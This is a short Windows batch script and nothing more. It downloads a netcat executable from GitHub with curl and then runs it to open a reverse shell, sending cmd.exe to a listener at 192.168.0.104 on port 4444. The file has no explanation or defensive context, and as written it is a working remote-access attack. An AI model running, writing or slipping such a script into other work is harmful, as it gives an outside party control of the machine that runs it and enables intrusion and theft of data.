@echo off
curl -o nc.exe https://github.com/diegocr/netcat/raw/refs/heads/master/nc.exe
nc.exe 192.168.0.104 4444 -e cmd
